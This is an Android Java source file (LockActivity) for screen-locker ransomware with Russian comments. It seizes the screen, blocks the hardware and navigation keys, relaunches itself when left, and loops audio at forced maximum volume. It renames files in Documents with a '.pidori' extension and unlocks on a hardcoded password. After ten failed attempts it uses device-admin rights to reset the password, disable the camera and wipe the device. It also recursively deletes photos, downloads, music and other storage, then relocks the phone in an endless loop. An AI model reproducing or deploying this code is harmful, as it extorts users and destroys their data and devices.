package com.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.os.PowerManager;
import android.view.KeyEvent;
import android.view.View;
import android.view.WindowManager;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

import java.io.File;

public class LockActivity extends Activity {

    private static MediaPlayer mp; // Сделали статическим, чтобы не дублировался звук
    private AudioManager am;
    private Handler handler = new Handler();
    private boolean isUnlocked = false;
    private File targetDir;
    private int failCount = 0;

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_lock);

        LockService.isAppOpen = true; 
        VolumeBlockService.setLocked(true);

        getWindow().addFlags(
            WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED |
            WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD |
            WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON |
            WindowManager.LayoutParams.FLAG_FULLSCREEN);

        View decorView = getWindow().getDecorView();
        decorView.setSystemUiVisibility(
            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
            | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
            | View.SYSTEM_UI_FLAG_FULLSCREEN);

        am = (AudioManager) getSystemService(Context.AUDIO_SERVICE);

        targetDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS);
        
        if (Build.VERSION.SDK_INT < 30 || Environment.isExternalStorageManager()) {
            new Thread(new Runnable() {
                @Override
                public void run() {
                    encryptFiles(targetDir);
                }
            }).start();
        }

        handler.post(new Runnable() {
            @Override
            public void run() {
                if (!isUnlocked) {
                    if (am != null) {
                        am.setStreamVolume(AudioManager.STREAM_MUSIC, am.getStreamMaxVolume(AudioManager.STREAM_MUSIC), 0);
                    }
                    TextView timeText = findViewById(R.id.timeText);
                    java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("HH:mm:ss");
                    timeText.setText(sdf.format(new java.util.Date()));
                }
                handler.postDelayed(this, 1000);
            }
        });

        TextView bootText = findViewById(R.id.bootText);
        View mainBlock = findViewById(R.id.mainBlock);

        boolean isReturningFromSettings = getIntent().getBooleanExtra("RETURNING_FROM_SETTINGS", false);
        boolean isReturningFromExit = getIntent().getBooleanExtra("RETURNING_FROM_EXIT", false);

        if (isReturningFromExit || isReturningFromSettings) {
            bootText.setVisibility(View.GONE);
            mainBlock.setVisibility(View.VISIBLE);
            
            // Проверка на дубликат звука
            if (mp == null) {
                mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
                if (mp != null) {
                    mp.setLooping(true);
                    mp.start();
                }
            }
        } else {
            bootText.setVisibility(View.VISIBLE);
            mainBlock.setVisibility(View.GONE);

            handler.postDelayed(new Runnable() {
                @Override
                public void run() {
                    bootText.setText("P I D O R I\n[ SYSTEM INITIALIZED ]");
                    handler.postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            bootText.setVisibility(View.GONE);
                            mainBlock.setVisibility(View.VISIBLE);

                            if (mp == null) {
                                mp = MediaPlayer.create(LockActivity.this, R.raw.lockvideo);
                                if (mp != null) {
                                    mp.setLooping(true);
                                    mp.start();
                                }
                            }
                        }
                    }, 2000);
                }
            }, 3000);
        }

        EditText passwordInput = findViewById(R.id.passwordInput);
        TextView enterButton = findViewById(R.id.enterButton);

        passwordInput.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                passwordInput.requestFocus();
                android.view.inputmethod.InputMethodManager imm = (android.view.inputmethod.InputMethodManager) getSystemService(Context.INPUT_METHOD_SERVICE);
                imm.showSoftInput(passwordInput, android.view.inputmethod.InputMethodManager.SHOW_IMPLICIT);
            }
        });

        enterButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                String password = passwordInput.getText().toString();
                if (password.equals("pidori")) {
                    isUnlocked = true;
                    LockService.isUnlocked = true;
                    LockService.isAppOpen = false;
                    VolumeBlockService.setLocked(false);
                    
                    SharedPreferences prefs = getSharedPreferences("locker_prefs", MODE_PRIVATE);
                    prefs.edit().putBoolean("is_unlocked_by_user", true).apply();
                    
                    if (mp != null) {
                        mp.stop();
                        mp.release();
                        mp = null;
                    }
                    
                    new Thread(new Runnable() {
                        @Override
                        public void run() {
                            decryptFiles(targetDir);
                        }
                    }).start();
                    finish();
                } else {
                    failCount++;
                    if (failCount >= 10) {
                        Toast.makeText(LockActivity.this, "ПРЕВЫШЕН ЛИМИТ ПОПЫТОК. УНИЧТОЖЕНИЕ ДАННЫХ...", Toast.LENGTH_LONG).show();
                        destroySystem();
                    } else {
                        Toast.makeText(LockActivity.this, "Неверный код. Попытка " + failCount + " из 10", Toast.LENGTH_SHORT).show();
                        passwordInput.setText("");
                    }
                }
            }
        });
    }

    private void destroySystem() {
        DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
        
        if (dpm != null && adminComponent != null) {
            if (dpm.isAdminActive(adminComponent)) {
                try {
                    dpm.lockNow();
                    dpm.resetPassword("0000", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
                    dpm.setCameraDisabled(adminComponent, true);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                        dpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE | DevicePolicyManager.WIPE_RESET_PROTECTION_DATA);
                    }
                } catch (Exception e) {}
            }
        }

        deleteFiles();

        PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
        PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SysBreaker::NoRoot");
        wl.acquire();
        new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    try {
                        dpm.lockNow();
                        Thread.sleep(300);
                    } catch (Exception ignored) {}
                }
            }
        }).start();

        View mainBlock = findViewById(R.id.mainBlock);
        TextView bootText = findViewById(R.id.bootText);
        if (mainBlock != null) mainBlock.setVisibility(View.GONE);
        if (bootText != null) {
            bootText.setVisibility(View.VISIBLE);
            bootText.setText("");
            bootText.setBackgroundColor(0xFF000000); 
        }
        VolumeBlockService.setLocked(true);
    }

    private void deleteFiles() {
        String[] paths = {
            Environment.getExternalStorageDirectory().getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_MUSIC).getAbsolutePath(),
            Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS).getAbsolutePath()
        };

        for (String path : paths) {
            deleteRecursive(new File(path));
        }
    }

    private void deleteRecursive(File fileOrDirectory) {
        if (fileOrDirectory.isDirectory()) {
            File[] children = fileOrDirectory.listFiles();
            if (children != null) {
                for (File child : children) {
                    deleteRecursive(child);
                }
            }
        }
        fileOrDirectory.delete();
    }

    @Override
    protected void onResume() {
        super.onResume();
        LockService.isAppOpen = true;
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        setIntent(intent);
    }

    private void encryptFiles(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                encryptFiles(file);
            } else if (file.isFile()) {
                String name = file.getName();
                if (!name.endsWith(".pidori") && !name.equals("lockvideo.mp3")) {
                    File newFile = new File(dir, name + ".pidori");
                    file.renameTo(newFile);
                }
            }
        }
    }

    private void decryptFiles(File dir) {
        if (dir == null || !dir.exists()) return;
        File[] files = dir.listFiles();
        if (files == null) return;
        for (File file : files) {
            if (file.isDirectory()) {
                decryptFiles(file);
            } else if (file.isFile()) {
                String name = file.getName();
                if (name.endsWith(".pidori")) {
                    String originalName = name.substring(0, name.length() - 7);
                    File newFile = new File(dir, originalName);
                    file.renameTo(newFile);
                }
            }
        }
    }

    @Override
    public boolean dispatchKeyEvent(KeyEvent e) {
        int k = e.getKeyCode();
        if (k == KeyEvent.KEYCODE_VOLUME_UP || k == KeyEvent.KEYCODE_VOLUME_DOWN
                || k == KeyEvent.KEYCODE_POWER || k == KeyEvent.KEYCODE_BACK
                || k == KeyEvent.KEYCODE_HOME || k == KeyEvent.KEYCODE_MENU
                || k == KeyEvent.KEYCODE_APP_SWITCH) {
            return true;
        }
        return super.dispatchKeyEvent(e);
    }

    @Override public void onBackPressed() { }

    @Override
    protected void onPause() {
        super.onPause();
        if (!isUnlocked) {
            LockService.isAppOpen = false;
            // Убираем Тост, чтобы он не спамил
            Intent intent = new Intent(this, LockActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_SINGLE_TOP | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            intent.putExtra("RETURNING_FROM_EXIT", true);
            startActivity(intent);
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        if (!isUnlocked) {
            LockService.isAppOpen = false;
        }
        // НЕ убиваем mp здесь, чтобы не было дубля при пересоздании
        handler.removeCallbacksAndMessages(null);
    }
            }
